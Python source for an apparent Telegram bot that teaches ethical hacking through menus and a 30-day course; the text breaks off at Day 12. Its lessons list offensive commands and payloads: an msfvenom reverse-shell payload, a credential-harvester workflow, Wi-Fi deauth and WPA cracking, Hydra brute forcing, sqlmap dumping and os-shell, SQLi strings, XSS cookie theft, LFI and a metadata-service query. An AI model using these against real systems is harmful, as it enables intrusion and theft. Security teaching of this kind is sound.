from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
import difflib
import os
from dotenv import load_dotenv
load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")

# Topics configuration
topics = {
    "main": [
        ("🛡️ Basic Hacking", "basic"),
        ("⚙️ Advanced Hacking", "advanced"),
        ("🛠️ Tools & Installation", "tools"),
        ("📈 Career & Certifications", "career"),
        ("🚀 Start Hacking", "Start"),
    ],

    "basic": [
        ("What is Ethical Hacking?", "WIH"),
        ("Types of Hackers", "TOH"),
        ("Steps for hacking", "SFH"),
        ("Reconnaissance", "REC"),
        ("Networking", "networking"),
        ("Linux Commands", "LC"),
        ("Installing Kali Linux", "IKL"),
        ("Interesting Linux Commands", "ILC")
    ],

    "Start": [(f"📅 Day {i}", f"day{i}") for i in range(1, 31)],

    "advanced": [
        ("🖥️ System Hacking", "system"),
        ("🧠 Social Engineering", "social"),
        ("📡 Recon & Info Gathering", "recon"),
        ("🧪 Penetration Testing", "pentesting"),
        ("📶 Wi-Fi & Network Hacking", "wifi"),
        ("📱 Mobile Hacking", "mobile"),
        ("💻 Linux & Terminal Setup", "linux"),
        ("🔐 Cryptography", "crypto"),
        ("🕵️ Vulnerability Assessment", "vuln"),
        ("🧰 Payloads & Exploits", "payloads"),
        ("🌐 Website Testing", "web"),
        ("☁️ Cloud Hacking", "cloud"),
        ("🦠 Malware Analysis", "malware")
    ],

    "tools": [
        ("🔍 Nmap", "nmap"),
        ("🌐 Wireshark", "wireshark"),
        ("🔑 Hydra", "hydra"),
        ("🧪 Burp Suite", "burpsuite"),
        ("📦 Metasploit", "metasploit"),
        ("🛡️ Nikto", "nikto"),
        ("🕷️ SQLMap", "sqlmap"),
        ("🔧 John the Ripper", "john"),
        ("📱 MobSF", "mobsf"),
        ("📡 Aircrack‑ng", "aircrackng"),
        ("🧰 Ghidra", "ghidra")
    ],
    "career": [
        ("Why Choose Ethical Hacking?", "why_career"),
        ("Top Ethical Hacking Certifications", "certs"),
        ("Roadmap to Become an Ethical Hacker", "roadmap"),
        ("Job Roles & Salaries", "jobs"),
        ("Career Tips & Resources", "career_tips")
    ],

}

content = {
    "basic": "*🛡️ Basic Hacking Topics:*\n\nBegin your journey into the world of ethical hacking. Choose a foundational topic to build your skills and unlock the path to becoming a cybersecurity expert.",

    "WIH": "*🛡️ What is Ethical Hacking?*\n\n"
           "Ethical hacking is the authorized practice of bypassing system security to identify potential threats and vulnerabilities in a network or system. "
           "Organizations hire ethical hackers to simulate cyberattacks and discover weak points that could be exploited by malicious actors.\n\n"
           "*Goals:*\n"
           "- Strengthen system defenses\n"
           "- Prevent unauthorized access\n"
           "- Ensure compliance with security standards\n"
           "- Minimize risks before real attackers exploit them\n\n"
           "✅ Ethical hacking is legal, authorized, and follows a code of conduct unlike malicious hacking.",

    "TOH": "*🎭 Types of Hackers:*\n\n"
           "1. *White Hat Hackers*: Cybersecurity professionals who legally hack systems to strengthen security.\n"
           "2. *Black Hat Hackers*: Criminal hackers who exploit systems for financial gain, disruption, or theft.\n"
           "3. *Gray Hat Hackers*: Operate in the gray area — they may hack without permission but don’t have malicious intent.\n"
           "4. *Script Kiddies*: Inexperienced individuals who use pre-built tools or scripts without understanding how they work.\n"
           "5. *Hacktivists*: Hackers motivated by political or social causes, aiming to promote agendas or protest.\n"
           "6. *State-Sponsored Hackers*: Work for governments to attack or defend against foreign threats.\n"
           "7. *Red Team vs. Blue Team Hackers*: Red teams simulate attacks; blue teams defend against them.",

    "SFH": "*🧱 Steps for Hacking (Cyber Kill Chain):*\n\n"
           "1. *Reconnaissance*: Gathering information about the target (passive and active scanning).\n"
           "2. *Scanning*: Identifying live systems, ports, and services using tools like Nmap or Nessus.\n"
           "3. *Gaining Access*: Exploiting known vulnerabilities (e.g., using Metasploit).\n"
           "4. *Maintaining Access*: Installing malware or creating backdoors for persistent access.\n"
           "5. *Clearing Tracks*: Deleting logs and hiding malicious files to avoid detection.\n"
           "6. *Post-Exploitation*: Data exfiltration, lateral movement, or privilege escalation.\n"
           "7. *Reporting*: (In ethical hacking) Documenting findings and suggesting fixes.",

    "REC": "*🔍 Reconnaissance (Footprinting):*\n\n"
           "The first phase of ethical hacking where the goal is to gather as much data as possible about the target without alerting them.\n\n"
           "*Types:*\n"
           "- Passive: Public sources like WHOIS, search engines, social media.\n"
           "- Active: Direct interaction like port scanning, DNS queries.\n\n"
           "*Common Tools:*\n"
           "- `whois`, `nslookup`: DNS and domain details\n"
           "- `theHarvester`: Email & subdomain harvesting\n"
           "- `Maltego`: Visual data mining\n"
           "- `Recon-ng`, `Shodan`, `Google Dorking`\n\n"
           "🎯 Goal: Map the target’s attack surface.",

    "networking": "*🌐 Networking Essentials for Hackers:*\n\n"
                  "A strong understanding of networking is crucial in ethical hacking. It helps you understand how systems communicate and where vulnerabilities may exist.\n\n"
                  "*Topics to Master:*\n"
                  "- OSI & TCP/IP Models\n"
                  "- IP Addressing & Subnetting\n"
                  "- TCP vs UDP Protocols\n"
                  "- ARP, ICMP, DNS, DHCP\n"
                  "- Common Ports: 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), etc.\n\n"
                  "*Useful Networking Commands:*\n"
                  "`ping`, `traceroute`, `ipconfig/ifconfig`, `netstat`, `nslookup`, `nmap`\n\n"
                  "*Packet Analysis Tool:* `Wireshark`\n"
                  "*Port Scanner:* `Nmap`",

    "LC": "*🐧 Essential Linux Commands for Hackers:*\n\n"
          "Linux is the preferred OS for hackers due to its flexibility, scripting power, and open-source nature.\n\n"

          "*🔹 File & Directory Commands:*\n"
          "`ls` – List directory contents  →  `ls -la`\n"
          "`cd` – Change directory  →  `cd /etc`\n"
          "`dir` – List contents of directory  →  `dir /home`\n"
          "`pwd` – Print current working directory  →  `pwd`\n"
          "`mkdir` – Make new directory  →  `mkdir new_folder`\n"
          "`rmdir` – Remove empty directory  →  `rmdir old_folder`\n"
          "`rm` – Remove file/directory  →  `rm -rf file.txt`\n"
          "`mv` – Move or rename files  →  `mv old.txt new.txt`\n"
          "`cp` – Copy files/directories  →  `cp file.txt /tmp/`\n\n"

          "*🔐 Permissions & Ownership:*\n"
          "`chmod` – Change file permissions  →  `chmod 755 script.sh`\n"
          "`chown` – Change file owner/group  →  `chown ankit:admin file.txt`\n"
          "`chgrp` – Change group ownership  →  `chgrp devs file.txt`\n"
          "`umask` – Set default permission mask  →  `umask 0022`\n"
          "`chmod +x script.sh` – Make script executable\n\n"

          "*🌐 Networking Tools:*\n"
          "`ifconfig` – View/modify network interfaces  →  `ifconfig eth0 down`\n"
          "`ip` – Manage IP, routes, interfaces  →  `ip addr show`\n"
          "`netstat` – Show active connections and ports  →  `netstat -tuln`\n"
          "`ping` – Check connectivity  →  `ping -c 4 google.com`\n"
          "`curl` – Transfer data from or to a server  →  `curl -I https://example.com`\n"
          "`wget` – Download files from the internet  →  `wget -c https://site.com/file.iso`\n"
          "`dig` – DNS lookup and domain info  →  `dig +short openai.com`\n\n"

          "*⚙️ System & Process Management:*\n"
          "`ps` – Show running processes  →  `ps aux`\n"
          "`top` – Real-time system monitor  →  `top`\n"
          "`kill` – Terminate a process  →  `kill 1234`\n"
          "`htop` – Enhanced process viewer (needs install)  →  `htop`\n"
          "`df` – Show disk usage  →  `df -h`\n"
          "`du` – Show directory size  →  `du -sh /home/user`\n"
          "`uptime` – Show system uptime and load  →  `uptime`\n\n"

          "*📝 Viewing & Editing Files:*\n"
          "`cat` – Display file content  →  `cat file.txt`\n"
          "`less` – Scroll through file content  →  `less bigfile.log`\n"
          "`nano` – Simple terminal editor  →  `nano notes.txt`\n"
          "`vi` – Powerful text editor  →  `vi config.sh`\n"
          "`grep` – Search for patterns in files  →  `grep 'error' log.txt`\n"
          "`find` – Locate files by name or type  →  `find / -name \"*.conf\"`\n\n"

          "*💡 Scripting & Automation:*\n"
          "`bash` – Shell scripting language  →  Automate tasks using `.sh` scripts\n"
          "`cron` – Schedule repetitive tasks  →  `crontab -e`\n"
          "`expect` – Automate interactive shell sessions  →  Automate SSH, FTP, etc.\n\n",

    "ILC": "*🐧 Interesting Linux Commands for Hackers:*\n\n"
           "*😎 Fun & Hacker-Style Terminal Commands:*\n"
           "`cowsay 'Hack the planet!'` – Talking ASCII cow 🐄\n"
           "`sl` – Steam locomotive when you mistype `ls`\n"
           "`cmatrix` – Matrix rain effect 💻\n"
           "`lolcat` – Rainbow-colored output 🌈\n"
           "`figlet HACKER` – Big ASCII banners\n"
           "`toilet H4cker` – Styled ASCII text art\n"
           "`oneko` – Cat chases your cursor 🐱\n"
           "`aafire` – Burning fire in terminal 🔥\n"
           "`asciiquarium` – ASCII aquarium 🐠\n"
           "`fortune | cowsay | lolcat` – Fortune cow combo 🐄🌈\n"
           "`telnet towel.blinkenlights.nl` – Watch Star Wars in ASCII ⭐\n"
           "`rev`, `yes`, `cal`, `uptime`, `date`, `watch` – Quirky tools\n"
           "`hollywood` – Simulated hacker terminal effect 🎬\n"
           "`hacker` – Show off with animated hacking look\n\n"
           "you can install this all command by \n\n"
           "`sudo apt install cowsay lolcat sl cmatrix figlet toilet fortune aafire oneko asciiquarium hollywood` \n\n"
           "*🔥 Tip:* You can combine fun tools with `lolcat` for extra flair. Try `figlet Hello | lolcat`!",

    "IKL": "*💻 Installing Kali Linux (Step-by-Step):*\n\n"
           "Kali Linux is a Debian-based distribution packed with pre-installed security tools.\n\n"
           "*1. Download ISO:*\n"
           "- Official site: [https://www.kali.org](https://www.kali.org)\n\n"
           "*2. Create Bootable USB:*\n"
           "- Use `Rufus` (Windows) or `Balena Etcher` (Linux/macOS)\n\n"
           "*3. Install Kali:*\n"
           "- Boot your system from the USB\n"
           "- Follow on-screen installation steps (language, time, disk partitioning, etc.)\n\n"
           "*4. Post-Installation:*\n"
           "- Update system:\n"
           "  `sudo apt update && sudo apt upgrade`\n"
           "- Install guest additions (if using VirtualBox):\n"
           "  `sudo apt install virtualbox-guest-utils`\n\n"
           "*5. Run in Virtual Machine (Optional):*\n"
           "- Use VirtualBox or VMware for dual-boot-free experience.\n\n"
           "🎯 *Recommended*: Use a VM if you're a beginner to avoid damaging your primary system.",

    "advanced": "*🔍 Advanced Hacking Topics:*\n\nDive deep into real-world offensive techniques. Select a topic:",

    "system": "*🔐 System Hacking:* (Windows/Linux)\n\n📌 Key Phases:\n"
              "- *Gaining Access*: Weak creds, unpatched services, malware\n"
              "- *Privilege Escalation*: Sudo misconfigurations, kernel exploits, token impersonation\n"
              "- *Maintaining Access*: Backdoors, scheduled tasks, services\n"
              "- *Clearing Tracks*: Modify event logs, timestamps (e.g., Timestomp)\n\n"
              "🛠 Tools: `mimikatz`, `winPEAS`, `linPEAS`, `chntpw`, `meterpreter`\n"
              "💡 *Example*: `net user administrator /active:yes` enables built-in admin on Windows.",

    "social": "*🎭 Social Engineering:*\n\nTarget human trust and behavior.\n📌 Techniques:\n"
              "- *Phishing*: Fake emails/websites to steal credentials\n"
              "- *Baiting*: Malware-infected USB drops\n"
              "- *Impersonation*: Posing as trusted person\n\n"
              "🛠 Tool: `setoolkit`\n"
              "💡 *Workflow*: `sudo setoolkit` → Social‑Engineering Attacks → Credential Harvester → Mock site → Collect creds.",

    "recon": "*🔎 Recon & Info Gathering:*\n\nPhase aims to build a complete map of the target environment.\n📌 Use Cases:\n"
             "- Domain registration: `whois example.com`\n"
             "- DNS entry collection: `nslookup`, `dig`, `dnsenum`\n"
             "- IoT & device fingerprinting: `shodan host 1.2.3.4`\n"
             "- Directory enumeration: `dirb http://target.com`\n\n"
             "Outcome: A complete blueprint for attack planning.",

    "pentesting": "*🧪 Penetration Testing Structure:*\n\nA methodical approach to simulate cyber-attacks.\n📌 Types:\n"
                  "- *Blackbox*: No prior intel\n"
                  "- *Graybox*: Partial access/info\n"
                  "- *Whitebox*: Full system data\n\n"
                  "📘 Phases:\n"
                  "1. Planning & Scoping\n2. Recon & Scanning\n3. Exploitation\n4. Post‑Exploitation\n5. Reporting & Remediation\n\n"
                  "⚙️ Tools: Metasploit, Burp Suite, Nmap, SQLmap, Nikto",

    "wifi": "*📶 Wi‑Fi & Wireless Attacks:*\n\nHack local wireless networks.\n📌 Steps:\n"
            "1. Enable monitor mode: `airmon-ng start wlan0`\n"
            "2. Capture handshakes: `airodump-ng wlan0mon`\n"
            "3. Deauth to force clients to reconnect: `aireplay-ng -0 5 -a <BSSID> wlan0mon`\n"
            "4. Crack WPA/WPA2: `aircrack-ng -w wordlist.txt capture.cap`\n\n"
            "⚙️ Tools: aircrack-ng suite, hashcat, reaver, wash",

    "mobile": "*📱 Mobile Hacking:*\n\nExplore app exploitation & analysis.\n📌 Topics:\n"
              "- *Static Analysis*: Reverse-engineer APK using `APKTool`\n"
              "- *Dynamic*: Use `Frida`, `Xposed`\n"
              "- *RATs & Spyware*: `AndroRAT`, custom payloads\n\n"
              "⚙️ Framework: `MobSF` – upload APK, receive vulnerability report.\n"
              "`./setup.sh` → open http://localhost:8000 → scan APK/IPA",

    "linux": "*🐧 Linux & Terminal Foundations:*\n\nLearn advanced shell usage and scripting.\n📌 Essentials:\n"
             "- Terminal commands and directory structure\n"
             "- Permissions & SUID bits\n"
             "- Automating tasks via bash scripts and cron jobs\n\n"
             "💡 Example script:\n```bash\n#!/bin/bash\n# scan host\nnmap -sS $1\n```",

    "crypto": "*🔐 Cryptography Practical Guide:*\n\nSafeguard communication/data.\n📌 Topics:\n"
              "- *Hashing* (MD5/SHA256) for integrity checks\n"
              "- *Symmetric Encryption* (AES)\n"
              "- *Asymmetric Encryption* (RSA, ECC)\n\n"
              "🛠 Tools: `openssl`, `gpg`, `hashcat`\n"
              "`echo -n password | sha256sum`\n"
              "`openssl enc -aes-256-cbc -salt -in file.txt -out file.enc`",

    "vuln": "*🛡️ Vulnerability Assessment:*\n\nScan and identify possible weak points.\n📌 Techniques:\n"
            "- *Automated scans*: Nmap scripts, Nessus, OpenVAS\n"
            "- *Manual reviews*: Code, logic, auth flows\n\n"
            "🛠 Commands:\n"
            "`nmap --script vuln -p80,443 target.com`\n"
            "`nikto -h http://target.com`",

    "payloads": "*💥 Payloads & Exploits:*\n\nGenerate attack vectors using msfvenom.\n📌 Workflow:\n"
                "1. Select payload type (reverse shell)\n"
                "2. Generate binary/script\n"
                "3. Serve it and catch a session via Metasploit\n\n"
                "Example:\n"
                "`msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe`",

    "web": "*🌐 Website Security Testing:*\n\nIdentify and test web vulnerabilities.\n📌 Focus Areas:\n"
           "- SQL Injection (SQLi)\n"
           "- Cross‑Site Scripting (XSS)\n"
           "- Cross‑Site Request Forgery (CSRF)\n"
           "- Insecure file uploads, LFI/RFI\n\n"
           "🛠 Tools:\n"
           "`sqlmap -u \"http://target.com/?id=1\" --dbs`\n"
           "Burp Suite with Scanner/Repeater modules\n"
           "`nikto` for server misconfigurations",

    "cloud": "*☁️ Cloud Hacking:*\n\nCloud environments (like AWS, Azure, GCP) can be misconfigured, making them vulnerable.\n\n🔐 *Key Techniques:*\n- Misconfiguration Exploits (e.g., public S3 buckets)\n- IAM Abuse (privilege escalation)\n- Metadata API Exploitation\n\n🛠 *Tools:*\n- `ScoutSuite`: Multi-cloud security auditing tool.\n- `Pacu`: AWS exploitation framework.\n\n💡 *Example Attack:*\n- Enumerating IAM roles:\n`aws iam list-roles`\n- Exploiting metadata service:\n`curl http://169.254.169.254/latest/meta-data/`",

    "malware": "*🦠 Malware Analysis:*\n\nMalware analysis helps understand how malicious software works and how to detect/remove it.\n\n🧪 *Techniques:*\n- Static Analysis (without execution)\n- Dynamic Analysis (during execution)\n- Reverse Engineering\n\n🛠 *Tools:*\n- `Ghidra`, `IDA Pro`, `PEStudio`, `VirusTotal`\n\n💡 *Tips:*\n- Use virtual machines (VMs) for safety.\n- Monitor file/registry/network behavior during execution.\n\n🔍 *Example Static Check:*\n`strings malware.exe | less`",

    "tools": "*🧰 Tools & Software Submenu:*\n\nSelect a tool to explore installation, real-world usage, examples, and pro tips.",

    "nmap": "*🔍 Nmap* – Port Scanner & Discovery Tool\n\n🛠 Install:\n`sudo apt install nmap`\n\n🔎 Usage Examples:\n"
            "`nmap -sS 192.168.1.0/24` (TCP SYN scan)\n"
            "`nmap -sV -p 1-1000 target.com` (service/version detection)\n"
            "`nmap -O target.com` (OS detection)\n\n💡 Tip: Use NSE scripts (`--script vuln`) for vulnerability scanning.",

    "wireshark": "*🌐 Wireshark* – Network Packets Analyzer\n\n🛠 Install:\n`sudo apt install wireshark`\n\n🧪 Usage Steps:\n"
                 "- Start GUI, choose interface\n"
                 "- Apply filters like `http`, `tcp.port==22`\n"
                 "- Analyze packet contents (handshakes, payloads)\n\n💡 Tip: Use `tshark` (CLI) for automated captures and analysis.",

    "hydra": "*🔑 Hydra* – Fast Protocol Brute-Forcer\n\n🛠 Install:\n`sudo apt install hydra`\n\n💡 Example Usage:\n"
             "`hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://target.com`\n"
             "`hydra -L users.txt -P pass.txt ssh://192.168.1.10`\n\n⚠️ Caution: Respect lockout policies and rate limits.",

    "burpsuite": "*🧪 Burp Suite* – Web Security Testing\n\n🛠 Install Community Edition:\n`sudo apt install burpsuite`\n\n⚙️ Setup:\n"
                 "1. Configure browser proxy to `127.0.0.1:8080`\n"
                 "2. Open site, capture request in Proxy → Intercept\n"
                 "3. Send to Repeater/Intruder for fuzzing\n\n💡 Tip: Use Scanner (Pro) or extension like **ActiveScan++**.",

    "metasploit": "*📦 Metasploit Framework* – Exploitation Platform\n\n🛠 Install:\n`sudo apt install metasploit-framework`\n\n🛠 Usage:\n"
                  "`msfconsole`\n"
                  "`search exploit/windows/smb`\n"
                  "`use exploit/...`\n"
                  "`set RHOSTS, LHOST`\n"
                  "`run`\n\n💡 Tip: Automate with `resource` scripts or use Metasploit Pro/Web UI.",

    "nikto": "*🛡️ Nikto* – Web Server Vulnerability Scanner\n\n🛠 Install:\n`sudo apt install nikto`\n\n💡 Usage:\n"
             "`nikto -h http://target.com`\n"
             "`nikto -Display V -Tuning 2`\n\nUse in recon phase to uncover vulnerable CGIs, outdated headers.",

    "sqlmap": "*🕷️ SQLMap* – Automated SQL Injection Tool\n\n🛠 Install:\n`sudo apt install sqlmap`\n\n💡 Usage:\n"
              "`sqlmap -u \"http://target.com/page.php?id=1\" --dbs`\n"
              "`--tables`, `--dump` to extract data\n"
              "`--os-shell` for remote shell if possible.",

    "john": "*🔧 John the Ripper* – Password Cracker\n\n🛠 Install:\n`sudo apt install john`\n\n💡 Usage:\n"
            "`john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt`\n"
            "`john --show hashfile.txt` to see cracked passwords\n\nSupports MD5, SHA-1, NTLM, etc.",

    "mobsf": "*📱 MobSF* – Mobile App Analysis\n\n🛠 Install:\n```bash\ngit clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git\ncd Mobile-Security-Framework-MobSF\n./setup.sh\n```\n\n🌐 Usage:\n"
             "Open http://localhost:8000 → upload APK/IPA\n"
             "Check UI for security reports: sensitive data, insecure API usage\n\n💡 Tip: Run Android emulator for dynamic 분석.",

    "ghidra": "*🧰 Ghidra* – Reverse Engineering Tool\n\n🛠 Install:\n"
              "- Download the ZIP from [ghidra-sre.org](https://ghidra-sre.org)\n"
              "- Unzip and run `./ghidraRun`\n\n🧩 Usage:\n"
              "Import executable → browse functions → decompile to Java-like code\n\n💡 Tip: Use Python scripts in Ghidra UI for automated batch analysis.",

    "aircrackng": "*📡 Aircrack‑ng* – Wi‑Fi Password Cracker\n\n🛠 Install:\n`sudo apt install aircrack-ng`\n\n🧪 Workflow:\n"
                  "1. `airmon-ng start wlan0`\n"
                  "2. Capture: `airodump-ng wlan0mon`\n"
                  "3. Deauth: `aireplay-ng -0 5 -a <BSSID> wlan0mon`\n"
                  "4. Crack: `aircrack-ng -w wordlist.txt capture.cap`\n\n💡 Tip: Use `cowpatty` or `hashcat` if GPU cracking.",

    "career": "*📈 Career & Certifications:*\n\nChoose a sub-topic below to explore your future in ethical hacking:",

    "why_career": "*Why Choose Ethical Hacking?*\n\nEthical hacking is a high-demand skill in the cybersecurity industry. With increasing cyber threats, companies actively hire professionals to secure systems, detect vulnerabilities, and prevent data breaches.\n\nBenefits:\n- High salary potential\n- Job satisfaction from solving critical problems\n- Global career opportunities\n- Continuous learning and challenge",

    "certs": "*Top Ethical Hacking Certifications:*\n\n1. CEH (Certified Ethical Hacker)\n2. OSCP (Offensive Security Certified Professional)\n3. CompTIA Security+\n4. CISSP (Certified Information Systems Security Professional)\n5. eJPT (eLearnSecurity Junior Penetration Tester)\n6. GPEN (GIAC Penetration Tester)\n\nThese validate your skills in ethical hacking, penetration testing, and network defense.",

    "roadmap": "*Roadmap to Become an Ethical Hacker:*\n\n1. Learn networking basics (TCP/IP, ports, protocols)\n2. Get comfortable with Linux & terminal\n3. Understand cybersecurity concepts\n4. Learn programming (Python recommended)\n5. Study tools like Nmap, Wireshark, Metasploit\n6. Practice on platforms like Hack The Box, TryHackMe\n7. Get certified (e.g., CEH, OSCP)\n8. Start freelancing or apply for entry-level security roles",

    "jobs": "*Job Roles & Salaries:*\n\n- 🔍 Penetration Tester: ₹6–20 LPA\n- 🔐 Security Analyst: ₹5–15 LPA\n- 🧠 Security Consultant: ₹8–25 LPA\n- 🕵️ Ethical Hacker: ₹5–18 LPA\n- 👨‍💻 Security Researcher: ₹6–22 LPA\n\nSalaries vary by skill level, certifications, and experience. Freelance ethical hackers can also earn through bug bounty programs (e.g., HackerOne, Bugcrowd).",

    "career_tips": "*Career Tips & Resources:*\n\n- Stay updated with sites like Hacker News, Cybrary, and Exploit-DB\n- Practice on labs: TryHackMe, Hack The Box, PortSwigger Labs\n- Build a portfolio (GitHub, LinkedIn)\n- Contribute to open source security tools\n- Network with professionals via conferences & Discord communities\n- Keep learning—cybersecurity evolves fast!",

    "day1": "*📅 Day 1: Introduction to Ethical Hacking & Lab Setup*\n\n"
    "Welcome to your hacking journey! Let's begin by understanding what ethical hacking is and how to set up a safe environment for practice.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Ethical Hacking\n"
    "- Black Hat vs White Hat Hackers\n"
    "- Setting Up Kali Linux in VirtualBox\n"
    "- Updating & Upgrading Kali Linux\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Download VirtualBox and Kali Linux ISO\n"
    "2. Create a VM and install Kali Linux\n"
    "3. Run `sudo apt update && sudo apt upgrade`\n"
    "4. Explore basic terminal: `ls`, `pwd`, `clear`, `whoami`\n\n"
    "*🎥 Suggested Videos:*\n"
    " [Introduction to Ethical Hacking](https://youtu.be/3HjAwJ8PfIs?si=GPWl7TwGr2o5uZ21)\n"
    " [Black Hat vs White Hat Hackers](https://youtu.be/8C9HmCnoV0E?si=SKYIjEZXWF0U2yMU)\n"
    " [Setting Up Kali Linux in VirtualBox](https://youtu.be/DfX5MB-zXEM?si=2jsbz8-Ce2bu15HF)\n\n"
    "*✅ Outcome:* Kali Linux VM is set up and ready for use.",

  "day2": "*📅 Day 2: Networking Essentials for Hackers*\n\n"
    "Understanding how devices talk over the network is critical.\n\n"
    "*🧠 Topics Covered:*\n"
    "- OSI vs TCP/IP Model\n"
    "- MAC, IP, Subnet, Ports\n"
    "- Common Services: DNS, DHCP, HTTP, FTP\n"
    "- Private vs Public IP\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Run `ifconfig` / `ip a` to view IP\n"
    "2. Use `ping`, `traceroute`, `netstat`, `nslookup`\n"
    "3. Use `nmap` to scan your own system: `nmap 127.0.0.1`\n\n"
    "*🎥 Suggested Videos:*\n"
    " [Networking Essentials for Hackers](https://youtu.be/xzGeiguILy8?si=GecBL6_EkyC9Z47d)\n\n"
    "*✅ Outcome:* Able to analyze basic networking structure and run basic diagnostic commands.",

  "day3": "*📅 Day 3: Linux Basics for Hackers*\n\n"
    "Linux is a hacker’s favorite OS. Get comfortable with terminal usage.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Linux Directory Structure (/etc, /var, /usr)\n"
    "- File Management: `cd`, `ls`, `mkdir`, `rm`\n"
    "- Permissions: `chmod`, `chown`\n"
    "- Piping and Redirection: `|`, `>`\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Navigate folders using `cd`, `ls -la`\n"
    "2. Create and delete files with `touch`, `rm -rf`\n"
    "3. Change file permissions: `chmod +x script.sh`\n"
    "4. Combine commands: `cat file.txt | grep 'admin'`\n\n"
    "*🎥 Suggested Videos:*\n"
    " [Linux Basics for Hackers](https://youtu.be/PhYmmD84oFY?si=i2ggx3NdzXZZL4kq)\n\n"
    "*✅ Outcome:* Comfortable with navigating and modifying Linux files via terminal.",

  "day4": "*📅 Day 4: Bash Scripting & Automation*\n\n"
    "Automation helps hackers save time. Today we’ll write basic bash scripts.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Bash\n"
    "- Writing a simple bash script\n"
    "- Variables and conditions\n"
    "- For & While Loops\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Write a script to scan IPs using ping:\n"
    "```bash\n"
    "#!/bin/bash\n"
    "for ip in {1..10}; do\n"
    "  ping -c 1 192.168.0.$ip\n"
    "done\n"
    "```\n"
    "2. Automate backup of files\n"
    "3. Use `crontab` to schedule a script\n\n"
    "*🎥 Suggested Videos:*\n"
    " [Bash Scripting & Automation](https://youtu.be/CeCah9nD9XE?si=AYk7mkZ4gM2nmZVP)\n\n"
    "*✅ Outcome:* Able to write and execute custom bash scripts.",

  "day5": "*📅 Day 5: Footprinting and Reconnaissance*\n\n"
    "Recon is the first step in hacking. It involves collecting data about the target.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Passive vs Active Recon\n"
    "- WHOIS, DNS Records\n"
    "- Google Dorking\n"
    "- Social Engineering Basics\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `whois example.com`\n"
    "2. Use `nslookup`, `dig`, `host`\n"
    "3. Practice Google Dorking: `site:example.com intitle:login`\n"
    "4. Install and try `theHarvester`\n"
    "```bash\n"
    "theHarvester -d example.com -l 100 -b google\n"
    "```\n\n"
    "*✅ Outcome:* You can collect basic intelligence about your targets.",

  "day6": "*📅 Day 6: Scanning & Enumeration*\n\n"
    "Learn how to actively scan targets and enumerate useful information.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Types of Scans (SYN, TCP, UDP)\n"
    "- Enumeration Techniques\n"
    "- Banner Grabbing\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `nmap -sS -sV target_ip`\n"
    "2. Use `enum4linux` for SMB Enumeration\n"
    "3. Banner grabbing with `telnet`, `netcat`, or `nmap`\n\n"
    "*✅ Outcome:* Able to perform active scans and extract enumeration data.",

      "day7": "*📅 Day 7: Vulnerability Scanning*\n\n"
    "Vulnerabilities are weaknesses. Today we’ll learn to find them.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Vulnerability Scanning\n"
    "- Types of Vulnerabilities\n"
    "- Tools: Nessus, OpenVAS\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Install Nessus on Kali Linux\n"
    "2. Scan local host for vulnerabilities\n"
    "3. Analyze a report and identify CVEs\n\n"
    "*✅ Outcome:* Able to run a vulnerability scan and understand the results.",

  "day8": "*📅 Day 8: Exploitation Basics with Metasploit*\n\n"
    "Let’s use Metasploit to understand how vulnerabilities are exploited.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Metasploit\n"
    "- msfconsole Basics\n"
    "- Exploit Modules & Payloads\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Start Metasploit: `msfconsole`\n"
    "2. Search & run a simple exploit: `exploit/windows/smb/ms08_067_netapi`\n"
    "3. Use `set payload` & `set RHOST`\n\n"
    "*✅ Outcome:* Able to execute a basic exploit using Metasploit.",

  "day9": "*📅 Day 9: Exploiting Web Applications (SQL Injection)*\n\n"
    "Web apps are full of juicy targets. We’ll start with SQLi.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Introduction to SQL Injection\n"
    "- Finding injectable parameters\n"
    "- Manual SQLi Techniques\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Set up DVWA (Damn Vulnerable Web App)\n"
    "2. Use `' OR 1=1 --` and `' UNION SELECT` payloads\n"
    "3. Extract DB names using error-based SQLi\n\n"
    "*✅ Outcome:* You can find and test SQLi vulnerabilities.",

  "day10": "*📅 Day 10: XSS (Cross Site Scripting)*\n\n"
    "XSS allows attackers to run scripts in users' browsers.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Types of XSS: Reflected, Stored, DOM\n"
    "- Common payloads\n"
    "- Bypassing filters\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use DVWA or bwapp for practice\n"
    "2. Inject `<script>alert(1)</script>`\n"
    "3. Use `document.cookie` to demonstrate cookie theft\n\n"
    "*✅ Outcome:* Understand XSS and how to detect/test it.",

    "day11": "*📅 Day 11: File Inclusion Vulnerabilities (LFI/RFI)*\n\n"
    "File inclusion flaws can give access to system files or remote code.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is LFI and RFI\n"
    "- Directory traversal\n"
    "- Practical Payloads\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Setup DVWA or a vulnerable server\n"
    "2. Try LFI using `?page=../../../../etc/passwd`\n"
    "3. Demonstrate RFI if allowed with external file\n\n"
    "*✅ Outcome:* Able to test for and exploit file inclusion issues.",

  "day12": "*📅 Day 12: Command Injection & Remote Code Execution (RCE)*\n\n"
    "Gain shell access by injecting system-level commands.\n\n"
    "*🧠 Topics Covered:*\n"
